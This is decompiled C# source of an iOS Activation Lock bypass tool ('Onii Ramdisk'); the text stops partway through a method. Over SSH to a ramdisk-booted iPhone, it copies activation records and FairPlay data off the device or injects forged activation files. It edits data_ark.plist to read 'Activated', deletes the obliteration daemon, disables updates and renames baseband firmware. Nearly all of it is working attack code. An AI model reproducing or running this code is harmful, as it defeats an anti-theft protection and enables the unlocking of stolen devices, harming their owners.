﻿using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Renci.SshNet;

// Token: 0x02000006 RID: 6
internal class Class21
{
	// Token: 0x0600002F RID: 47 RVA: 0x00005E48 File Offset: 0x00004048
	public void method_0()
	{
		string text = Class20.string_2;
		string text2 = ".\\Backups\\" + text;
		this.method_20(5, "[+] Checking SSH..");
		this.method_14();
		bool flag = !(Class20.string_11 == "15");
		if (flag)
		{
			this.method_5();
		}
		else
		{
			this.method_4();
		}
		try
		{
			bool flag2 = !File.Exists(".\\Backups\\" + text + ".zip");
			if (flag2)
			{
				Directory.CreateDirectory(text2);
				Directory.CreateDirectory(Environment.CurrentDirectory + "\\Backups\\" + text + "\\FairPlay\\");
				string text3 = this.method_12("find /mnt2/containers/Data/System -name activation_record.plist");
				string text4 = this.method_12("find /mnt2/containers/Data/System -name data_ark.plist");
				string text5 = this.method_12("find /mnt2/containers/Data/System -name 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
				this.method_20(30, "[+] Download Activation Records..");
				try
				{
					this.scpClient_0.Download(text5 + "Library/activation_records/activation_record.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\1"));
					this.scpClient_0.Download("/mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\3"));
					this.scpClient_0.Download(text5 + "Library/internal/data_ark.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\2"));
				}
				catch
				{
					this.method_13("chmod -R 777 " + text3);
					this.method_13("chmod -R 777 " + text4);
					this.scpClient_0.Download(text3, new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\1"));
					this.scpClient_0.Download(text4, new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\2"));
					this.scpClient_0.Download("/mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\3"));
				}
				this.method_10();
				this.method_20(60, "[+] Saving Activations Records..");
				Directory.CreateDirectory(Environment.CurrentDirectory + "\\Backups\\" + text);
				string text6 = Environment.CurrentDirectory + "\\Backups\\" + text;
				string text7 = Environment.CurrentDirectory + "\\Backups\\" + text + ".zip";
				ZipFile.CreateFromDirectory(text6, text7);
				bool flag3 = Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + text);
				if (flag3)
				{
					Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + text, true);
				}
				this.method_20(80, "[+] Saving backup...");
				Class6 @class = new Class6();
				@class.method_6("\niDevice Backup Hoàn thành..");
				this.method_18();
				this.method_20(100, "[+] Backup Hoàn thành!! | Device reboot in 5 Seconds");
				DialogResult dialogResult = MessageBox.Show("Backup Has Been Hoàn thành saved \n" + text7 + Class20.string_2 + ".zip \nErase device Now ??", "Backup Hoàn thành !!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				bool flag4 = dialogResult == DialogResult.Yes;
				if (flag4)
				{
					this.method_13("/usr/sbin/nvram oblit-inprogress=5");
					this.method_13("/sbin/reboot");
					MessageBox.Show("Erase Hoàn thành in Next Boot !!", "Onii Ramdisk", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					this.method_13("kill 1");
				}
			}
			else
			{
				MessageBox.Show("Sorry, Backup Already Exist In Folder ./Backups ;)", "Backup Exist", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.method_20(20, "[-] Backup Already Exist..");
			}
		}
		catch (Exception ex)
		{
			bool flag5 = !ex.Message.ToLowerInvariant().Contains("filename");
			if (flag5)
			{
				MessageBox.Show(ex.Message, "Onii Ramdisk Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				MessageBox.Show("Filename Not Found in device !! \n Maybe device in Hello Mode !!!\n Or filesystems not mounted !!", "Onii Ramdisk Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x06000030 RID: 48 RVA: 0x00006270 File Offset: 0x00004470
	public void method_1()
	{
		this.method_14();
		string text = this.method_12("find / -name activation_record.plist");
		Console.WriteLine(text);
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00006298 File Offset: 0x00004498
	public void method_2()
	{
		try
		{
			this.method_14();
			string text = this.method_12("ls /mnt2");
			bool flag = !(text != "");
			if (flag)
			{
				Console.WriteLine("Disk Not Mounted");
				this.method_20(95, "thất bại to Mount Data");
				MessageBox.Show("thất bại to Mount DATA !!!\nPlease Update Retain Data!!!", "thất bại MOUNT DISK2", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				Console.WriteLine("Disk Mounted");
				this.method_20(100, "Data Hoàn thành Mount");
				MessageBox.Show("Data Hoàn thành Mounted!", "Hoàn thành SSH Connected !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000032 RID: 50 RVA: 0x00006344 File Offset: 0x00004544
	public void method_3()
	{
		bool flag = Class20.string_11 == "15";
		if (flag)
		{
			this.string_10 = "disk0s1";
		}
		else
		{
			this.string_10 = "disk1";
		}
		this.method_20(20, "Mounting Systems");
		this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s1 /mnt1");
		Console.WriteLine("Systems disk1 Mounted");
		bool flag2 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s1").Trim() == "Preboot";
		if (flag2)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s1 /mnt6");
			Console.WriteLine("Preboot disk1 Mounted");
		}
		bool flag3 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s2").Trim() == "Preboot";
		if (flag3)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s2 /mnt6");
			Console.WriteLine("Preboot disk2 Mounted");
		}
		bool flag4 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s3").Trim() == "Preboot";
		if (flag4)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s3 /mnt6");
			Console.WriteLine("Preboot disk3 Mounted");
		}
		bool flag5 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s4").Trim() == "Preboot";
		if (flag5)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s4 /mnt6");
			Console.WriteLine("Preboot disk4 Mounted");
		}
		bool flag6 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s5").Trim() == "Preboot";
		if (flag6)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s5 /mnt6");
			Console.WriteLine("Preboot disk5 Mounted");
		}
		bool flag7 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s6").Trim() == "Preboot";
		if (flag7)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s6 /mnt6");
			Console.WriteLine("Preboot disk6 Mounted");
		}
		bool flag8 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s7").Trim() == "Preboot";
		if (flag8)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s7 /mnt6");
			Console.WriteLine("Preboot disk7 Mounted");
		}
		this.method_20(40, "Mounting Preboot");
		bool flag9 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s1").Trim() == "xART";
		if (flag9)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s1 /mnt7");
			Console.WriteLine("xART 1 Mounted");
		}
		bool flag10 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s2").Trim() == "xART";
		if (flag10)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s2 /mnt7");
			Console.WriteLine("xART 2 Mounted");
		}
		bool flag11 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s3").Trim() == "xART";
		if (flag11)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s3 /mnt7");
			Console.WriteLine("xART 3 Mounted");
		}
		bool flag12 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s4").Trim() == "xART";
		if (flag12)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s4 /mnt7");
			Console.WriteLine("xART 4 Mounted");
		}
		bool flag13 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s5").Trim() == "xART";
		if (flag13)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s5 /mnt7");
			Console.WriteLine("xART 5 Mounted");
		}
		bool flag14 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s6").Trim() == "xART";
		if (flag14)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s6 /mnt7");
			Console.WriteLine("xART 6 Mounted");
		}
		bool flag15 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s7").Trim() == "xART";
		if (flag15)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s7 /mnt7");
			Console.WriteLine("xART 7 Mounted");
		}
		this.method_20(50, "Mounting xART");
		bool flag16 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s1").Trim() == "Hardware";
		if (flag16)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s1 /mnt5");
			Console.WriteLine("Hardware Mounted");
		}
		bool flag17 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s2").Trim() == "Hardware";
		if (flag17)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s2 /mnt5");
			Console.WriteLine("Hardware disk2 Mounted");
		}
		bool flag18 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s3").Trim() == "Hardware";
		if (flag18)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s3 /mnt5");
			Console.WriteLine("Hardware disk3 Mounted");
		}
		bool flag19 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s4").Trim() == "Hardware";
		if (flag19)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s4 /mnt5");
			Console.WriteLine("Hardware disk4 Mounted");
		}
		bool flag20 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s5").Trim() == "Hardware";
		if (flag20)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s5 /mnt5");
			Console.WriteLine("Hardware disk5 Mounted");
		}
		bool flag21 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s6").Trim() == "Hardware";
		if (flag21)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s6 /mnt5");
			Console.WriteLine("Hardware disk6 Mounted");
		}
		bool flag22 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s7").Trim() == "Hardware";
		if (flag22)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s7 /mnt5");
			Console.WriteLine("Hardware disk7 Mounted");
		}
		this.method_20(70, "Mounting Hardware");
		bool flag23 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s4").Trim() == "Baseband Data";
		if (flag23)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s4 /mnt4");
			Console.WriteLine("Baseband Data disk4 Mounted");
		}
		bool flag24 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s5").Trim() == "Baseband Data";
		if (flag24)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s5 /mnt4");
			Console.WriteLine("Baseband Data disk5 Mounted");
		}
		bool flag25 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s6").Trim() == "Baseband Data";
		if (flag25)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s6 /mnt4");
			Console.WriteLine("Baseband Data disk4 Mounted");
		}
		bool flag26 = this.method_12("/System/Library/Filesystems/apfs.fs/apfs.util -p /dev/" + this.string_10 + "s7").Trim() == "Baseband Data";
		if (flag26)
		{
			this.method_13("/sbin/mount_apfs -R /dev/" + this.string_10 + "s7 /mnt4");
			Console.WriteLine("Baseband Data disk7 Mounted");
		}
		this.method_20(70, "Mounting Baseband Data");
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00006C9C File Offset: 0x00004E9C
	public void method_4()
	{
		this.method_14();
		this.method_3();
		bool flag = !(Class20.string_9 == "0x7000") && !(Class20.string_9 == "0x7001") && !(Class20.string_9 == "0x8960");
		if (flag)
		{
			this.method_13("/usr/libexec/seputil --gigalocker-init");
			this.method_13("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
		}
		else
		{
			this.method_13("mount_filesystems");
		}
		this.method_20(90, "Mounting Data");
		this.method_13("/sbin/mount_apfs -R /dev/disk0s1s2 /mnt2");
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00006D38 File Offset: 0x00004F38
	public void method_5()
	{
		try
		{
			this.method_3();
			this.method_13("/usr/libexec/seputil --gigalocker-init");
			this.method_13("/usr/sbin/nvram oblit-inprogress=1 rev=2");
			this.method_13("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
			this.method_13("/usr/sbin/nvram -d oblit-inprogres && /usr/sbin/nvram -d oblit-inprogres");
			this.method_20(90, "Mounting Data");
			this.method_13("/sbin/mount_apfs /dev/disk1s2 /mnt2");
		}
		catch
		{
		}
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00006DB0 File Offset: 0x00004FB0
	public void method_6()
	{
		try
		{
			this.method_3();
			this.method_13("/usr/libexec/seputil --gigalocker-init");
			this.method_13("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
			this.method_20(90, "Mounting Data");
			this.method_13("/sbin/mount_apfs /dev/disk1s2 /mnt2");
		}
		catch
		{
		}
	}

	// Token: 0x06000036 RID: 54 RVA: 0x00006E10 File Offset: 0x00005010
	public bool method_7()
	{
		this.method_14();
		bool flag2 = Class20.string_11 == "15";
		if (flag2)
		{
			this.method_4();
		}
		else
		{
			this.method_6();
		}
		string text = Class20.string_2;
		string text2 = ".\\Backups\\" + text + ".zip";
		bool isConnected = this.scpClient_0.IsConnected;
		bool flag3 = !File.Exists(text2);
		if (flag3)
		{
			this.method_19();
		}
		bool flag;
		try
		{
			bool flag4 = !this.scpClient_0.IsConnected;
			if (flag4)
			{
				this.scpClient_0.Connect();
			}
			bool flag5 = Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + text);
			if (flag5)
			{
				Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + text, true);
			}
			string text3 = Environment.CurrentDirectory + "\\Backups\\" + text + ".zip";
			string text4 = Environment.CurrentDirectory + "\\Backups\\" + text;
			ZipFile.ExtractToDirectory(text3, text4);
			File.Copy(Environment.CurrentDirectory + "\\files\\com.apple.purplebuddy.plist", text4 + "\\com.apple.purplebuddy.plist");
			this.method_20(20, "[+] Checking Backup...");
			string text5 = this.method_12("find /mnt2/containers/Data/System -iname 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
			this.method_12("rm -rf /mnt2/mobile/Media/Downloads/" + text);
			this.method_12("rm -rf /mnt2/mobile/Media/" + text);
			this.method_20(30, "[+] Uploading Backup Via Scp");
			this.method_12("mkdir /mnt2/mobile/Media/Downloads/" + text);
			this.scpClient_0.Upload(new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + text), "/mnt2/mobile/Media/Downloads/" + text);
			this.method_12("mv -f /mnt2/mobile/Media/Downloads/" + text + " /mnt2/mobile/Media/" + text);
			this.method_12("chown -R mobile:mobile /mnt2/mobile/Media/" + text);
			this.method_20(40, "[+] Preparing Device...");
			this.method_12("chmod -R 755 /mnt2/mobile/Media/" + text);
			this.method_12("chmod 644 /mnt2/mobile/Media/" + text + "/1");
			this.method_12("chmod 644 /mnt2/mobile/Media/" + text + "/2");
			this.method_12("chmod 644 /mnt2/mobile/Media/" + text + "/3");
			Thread.Sleep(2500);
			this.method_12("find /mnt2/containers/Data/System -name activation_record.plist");
			this.method_12("find /mnt2/containers/Data/System -name data_ark.plist");
			this.method_20(50, "[+] IC-Info.sisv...");
			this.method_12("rm -rf /mnt2/mobile/Library/FairPlay");
			this.method_12("mv -f /mnt2/mobile/Media/" + text + "/FairPlay /mnt2/mobile/Library/");
			this.method_12("chmod -R 755 /mnt2/mobile/Library/FairPlay/");
			this.method_12("chown -R mobile:mobile /mnt2/mobile/Library/FairPlay");
			this.method_12("chmod 664 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_12("chflags nouchg " + text5 + "/Library /internal/data_ark.plist");
			this.method_20(50, "[+] Checking Device...");
			this.method_12(string.Concat(new string[]
			{
				"mv -f /mnt2/mobile/Media/",
				text,
				"/2 ",
				text5,
				"/Library/internal/data_ark.plist"
			}));
			this.method_12("chmod 755 " + text5 + "/Library/internal/data_ark.plist");
			this.method_12("chflags uchg " + text5 + "/Library/internal/data_ark.plist");
			this.method_12("mkdir " + text5 + "/Library/activation_records");
			this.method_12(string.Concat(new string[]
			{
				"mv -f /mnt2/mobile/Media/",
				text,
				"/1 ",
				text5,
				"/Library/activation_records/activation_record.plist"
			}));
			this.method_12("chmod 755 " + text5 + "/Library/activation_records/activation_record.plist");
			this.method_12("chmod 777 " + text5 + "/Library/activation_records/activation_record.plist");
			this.method_12("chflags uchg " + text5 + "/Library/activation_records/activation_record.plist");
			this.method_12("chflags nouchg /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_12("mv -f /mnt2/mobile/Media/" + text + "/3 /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_12("chown root:mobile /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_12("chmod 755 /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_12("chflags uchg /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_12("launchctl unload /mnt1/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist > /dev/null 2>&1");
			this.method_12("launchctl load /mnt1/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
			this.method_12("mv -f /mnt2/mobile/Media/" + text + "/com.apple.purplebuddy.plist /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_12("rm -rf /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
			this.method_12("chmod 600 /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_12("/usr/bin/uicache --all && chflags uchg /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_12("rm -rf /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
			this.method_12("/bin/chmod 600 /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
			this.method_12("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
			this.method_12("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
			this.method_12("rm -rf /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
			this.method_12("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
			this.method_12("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist");
			this.method_12("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.OTACrachCopier.plist");
			this.method_12("/bin/launchctl unload /mnt1/System/Library/LaunchDaemons/com.apple.CommCenter.plist");
			this.method_20(70, "[+] Activating...");
			Class6 @class = new Class6();
			@class.method_6("\n✅ Passcode Device Activated Sucessfully!!!");
			bool flag6 = Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + text);
			if (flag6)
			{
				Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + text, true);
			}
			this.method_20(100, "[+] Success! Device reboot in 5 seconds");
			this.method_13("kill 1");
			MessageBox.Show("Device " + Class20.string_1 + " Hoàn thành Activated You Can OTA UPDATE, But Can't Restore!", "Hoàn thành ACTIVATED!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			this.method_9();
			flag = true;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			flag = false;
		}
		return flag;
	}

	// Token: 0x06000037 RID: 55 RVA: 0x000073F4 File Offset: 0x000055F4
	public bool method_8()
	{
		this.method_14();
		bool flag2 = !(Class20.string_11 == "15");
		if (flag2)
		{
			this.method_6();
		}
		else
		{
			this.method_4();
		}
		string text = "hello_screen";
		bool flag;
		try
		{
			this.method_20(10, "[+] bắt đầu Bypass iOS 15..");
			bool flag3 = !this.sshClient_0.IsConnected;
			if (flag3)
			{
				this.sshClient_0.Connect();
			}
			bool flag4 = !this.scpClient_0.IsConnected;
			if (flag4)
			{
				this.scpClient_0.Connect();
			}
			this.method_12("find /mnt2/containers/Data/System -name 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
			this.method_20(20, "[+] Checking Activation Files..");
			string text2 = this.method_12("find /mnt2/containers/Data/System -iname 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
			this.method_13("rm -rf /mnt2/mobile/Media/Downloads/" + text);
			this.method_13("rm -rf /mnt2/mobile/Media/" + text);
			this.method_20(30, "[+] Uploading Activation Files..");
			this.method_13("mkdir /mnt2/mobile/Media/Downloads/" + text);
			string text3 = File.ReadAllText("ssl/udid.pl");
			bool flag5 = !File.Exists(Environment.CurrentDirectory + "\\ActivationFiles\\" + text3 + "\\com.apple.purplebuddy.plist");
			if (flag5)
			{
				File.Copy(Environment.CurrentDirectory + "\\files\\com.apple.purplebuddy.plist", Environment.CurrentDirectory + "\\ActivationFiles\\" + text3 + "\\com.apple.purplebuddy.plist");
			}
			this.scpClient_0.Upload(new DirectoryInfo(Environment.CurrentDirectory + ".\\ActivationFiles\\" + text3 + "\\"), "/mnt2/mobile/Media/Downloads/hello_screen/");
			this.method_13("mv -f /mnt2/mobile/Media/Downloads/" + text + " /mnt2/mobile/Media/" + text);
			this.method_13("chown -R mobile:mobile /mnt2/mobile/Media/" + text);
			this.method_20(40, "[+] Preparing Device..");
			this.method_13("chmod -R 755 /mnt2/mobile/Media/" + text);
			this.method_13("chmod 644 /mnt2/mobile/Media/" + text + "/activation_record.plist");
			this.method_13("chmod 644 /mnt2/mobile/Media/" + text + "/Wildcard.der");
			Thread.Sleep(4000);
			this.method_20(50, "[+] Creating Info-sisv Files..");
			this.method_13("rm -rf /mnt2/mobile/Library/FairPlay");
			this.method_13("mkdir -p -m 00755 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes");
			this.method_13("mv -f /mnt2/mobile/Media/hello_screen/IC-Info.sisv /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/");
			this.method_13("chmod 00664 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_13("chown -R mobile:mobile /mnt2/mobile/Library/FairPlay");
			this.method_20(70, "[+] Creating Activation Files...");
			this.method_13("rm -rf " + text2 + "/Library/activation_records");
			this.method_13("mkdir " + text2 + "/Library/activation_records");
			this.method_13("chflags nouchg " + text2 + "/Library/activation_records");
			this.method_13(string.Concat(new string[]
			{
				"mv -f /mnt2/mobile/Media/",
				text,
				"/activation_record.plist ",
				text2,
				"/Library/activation_records/activation_record.plist"
			}));
			this.method_13("mv -f /mnt2/mobile/Media/" + text + "/com.apple.purplebuddy.plist /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_13("chmod 755 " + text2 + "/Library/activation_records/activation_record.plist");
			this.method_13("chmod 777 " + text2 + "/Library/activation_records/activation_record.plist");
			this.method_20(80, "[+] Injecting Activation Files..");
			this.method_13("chflags uchg " + text2 + "/Library/activation_records/activation_record.plist");
			this.method_13("chflags nouchg /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_13("chflags nouchg " + text2 + "/Library /internal/data_ark.plist");
			this.method_13("plutil -dict -kPostponementTicket /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_13("plutil -kPostponementTicket -ActivationState -string Activated /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_13("plutil -kPostponementTicket -ActivityURL -string https://albert.apple.com/deviceservices/activity /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_13("plutil -kPostponementTicket -PhoneNumberNotificationURL -string https://albert.apple.com/deviceservices/phoneHome /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_13("plutil -kPostponementTicket -ActivationTicket -string '$(cat /mnt2/mobile/Media/" + text + "/Wildcard.der)' /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_13("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BuildVersion' -string $build $key");
			this.method_13("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - LastActivated' -string $build $key");
			this.method_13("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - ActivationState' -remove $key");
			this.method_13("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BrickState' -remove $key");
			this.method_13("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - ActivationState' -string Activated $key");
			this.method_13("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BrickState' -0 -false $key");
			this.method_13("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); plutil -binary $key");
			this.method_13("chflags uchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_13("chflags uchg " + text2 + "/Library /internal/data_ark.plist");
			bool flag6 = Class20.string_7 == "F97SF2AQFFGD";
			if (flag6)
			{
				this.method_20(90, "[+] Delete baseband Data !!!");
				this.method_13("chflags -R nouchg /mnt6/*/usr/local/standalone/firmware/");
				this.method_13("mv -f /mnt6/$(cat /mnt6/active)/usr/local/standalone/firmware/Baseband /mnt6/$(cat /mnt6/active)/usr/local/standalone/firmware/Baseband2");
			}
			else
			{
				this.method_20(90, "[+] Delete baseband Data !!!");
				this.method_13("chmod 644 /mnt2/mobile/Media/" + text + "/com.apple.commcenter.device_specific_nobackup.plist");
				this.method_13("mv -f /mnt2/mobile/Media/" + text + "/com.apple.commcenter.device_specific_nobackup.plist /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				this.method_13("chflags -R nouchg /mnt6/*/usr/local/standalone/firmware/");
				this.method_13("mv -f /mnt6/$(cat /mnt6/active)/usr/local/standalone/firmware/Baseband /mnt6/$(cat /mnt6/active)/usr/local/standalone/firmware/Baseband2");
			}
			this.method_13("kill 1");
			Class6 @class = new Class6();
			@class.method_6("\nHello Device Hoàn thành Activated !!");
			this.method_20(100, "Device Succesfully Activated!");
			this.method_9();
			MessageBox.Show("Device " + Class20.string_1 + " Hoàn thành Activated!\n", "Onii Ramdisk", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			flag = true;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Onii Ramdisk Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			flag = false;
		}
		return flag;
	}

	// Token: 0x06000038 RID: 56 RVA: 0x000079A8 File Offset: 0x00005BA8
	public void method_9()
	{
		Process[] processesByName = Process.GetProcessesByName("iproxy");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
		bool flag = File.Exists("%USERPROFILE%\\.ssh\\known_hosts");
		if (flag)
		{
			File.Delete("%USERPROFILE%\\.ssh\\known_hosts");
		}
	}

	// Token: 0x06000039 RID: 57 RVA: 0x000079FC File Offset: 0x00005BFC
	private void method_10()
	{
		try
		{
			string text = Class20.string_2;
			this.method_13("chmod -R 777 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_13("chmod -R 777 /mnt2/mobile/Library/FairPlay");
			this.scpClient_0.Download("/mnt2/mobile/Library/FairPlay", new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\FairPlay\\"));
